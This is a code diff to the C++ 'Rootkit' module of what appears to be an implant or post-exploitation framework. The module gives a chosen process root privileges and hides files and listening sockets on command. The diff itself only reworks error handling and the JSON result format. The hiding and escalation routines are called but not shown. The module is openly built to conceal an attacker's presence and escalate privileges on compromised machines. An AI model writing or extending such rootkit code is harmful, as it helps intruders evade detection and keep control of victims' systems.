@@ -19,11 +19,12 @@
 
 using json = nlohmann::json;
 
-void Rootkit::send_err(json ret_json, std::string str){
+void Rootkit::send_err(json inner, std::string str){
     std::cerr << str << std::endl;
-    json error_msg;
-    error_msg["error"] = str;
-    ret_json[module_type] = error_msg;
+    inner["result"] = "failure";
+    inner["error"] = str;
+    json ret_json;
+    ret_json[module_type] = inner;
     save_artifact(ret_json);
 }
 
@@ -45,8 +46,10 @@ void Rootkit::module_impl()
     run_ = false;
 
     std::cout << "Running " << module_type << " with args: " << args.dump() << std::endl;
-    json ret_json;
-    std::string error_msg;
+    json inner;
+    inner["result"] = "unknown";
+    inner["error"] = "";
+    inner["data"] = "";
     
     int id = std::stoi(std::string(args["id"]));
     std::string rootkit_args = args["args"];
@@ -63,8 +66,7 @@ void Rootkit::module_impl()
             if (pid > 0 && processExists(pid)) {
                 set_proc_root(pid);
             } else {
-                error_msg = "Invalid PID: " + rootkit_args;
-                Rootkit::send_err(ret_json, error_msg);
+                Rootkit::send_err(inner, std::string("Invalid PID: ") + rootkit_args);
                 return;
             }
             break;
@@ -75,8 +77,7 @@ void Rootkit::module_impl()
             if (boost::filesystem::exists(rootkit_args)) {
                 hide_filename(rootkit_args.c_str());
             } else {
-                error_msg = "File dosen't exist: " + rootkit_args;
-                Rootkit::send_err(ret_json, error_msg);
+                Rootkit::send_err(inner, std::string("File doesn't exist: ") + rootkit_args);
                 return;
             }
             break;
@@ -87,22 +88,21 @@ void Rootkit::module_impl()
             if (port > 0) {
                 hide_listening_socket((unsigned short)port);
             } else {
-                error_msg = "Invalid port number: " + rootkit_args;
-                Rootkit::send_err(ret_json, error_msg);
+                Rootkit::send_err(inner, std::string("Invalid port number: ") + rootkit_args);
                 return;
             }
             break;
         }
         
         default: {
-            error_msg = "Unknown ID: " + std::to_string(id);
-            Rootkit::send_err(ret_json, error_msg);
+            Rootkit::send_err(inner, std::string("Unknown ID: ") + std::to_string(id));
             return;
         }
     }
 
-    std::string str = "success";
-    ret_json[module_type] = CryptoUtils::base64_encode(std::vector<unsigned char>(str.begin(), str.end()));
+    inner["result"] = "success";
+    json ret_json;
+    ret_json[module_type] = inner;
     save_artifact(ret_json);
     return;
 }
